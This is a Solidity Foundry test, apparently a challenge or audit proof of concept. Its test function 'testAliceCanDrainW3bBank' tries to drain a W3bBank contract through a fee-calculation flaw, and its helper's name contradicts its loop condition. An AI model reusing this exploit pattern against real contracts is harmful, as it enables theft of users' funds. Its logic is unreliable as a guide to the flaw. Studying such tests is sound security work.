// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {W3bBank} from "../src/W3bBank.sol";

contract W3bBankTest is Test {
    W3bBank public w3bBank;
    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice");

    function setUp() public {
        vm.prank(owner);
        vm.deal(owner, 1 ether);
        vm.deal(alice, 1 ether);
        w3bBank = new W3bBank{value: 1 ether}();
    }

    function _calculateFee(uint256 amount, uint256 bonusBps)
        internal
        view
        returns (uint256)
    {
        unchecked {
            return (amount * (w3bBank.feeBps() + bonusBps)) / 1e4;
        }
    }

    function _autoCalculateAmountThatCauseFeeToBeHigherThanAmount() internal view returns (uint256) {
        uint256 amount = 1;
        while (true) {
            if (_calculateFee(amount, 0) <= amount) {
                return amount;
            }
            amount++;
        }

        return amount;
    }

    function testAliceCanDrainW3bBank() public {
        uint256 amount = _autoCalculateAmountThatCauseFeeToBeHigherThanAmount();
        vm.prank(alice);
        w3bBank.deposit{value: amount}(alice, 0);

        uint256 aliceBalanceBefore = alice.balance;
        vm.prank(alice);
        w3bBank.withdraw();
        uint256 aliceBalanceAfter = alice.balance;

        assertEq(aliceBalanceAfter - aliceBalanceBefore, amount);
    }
}
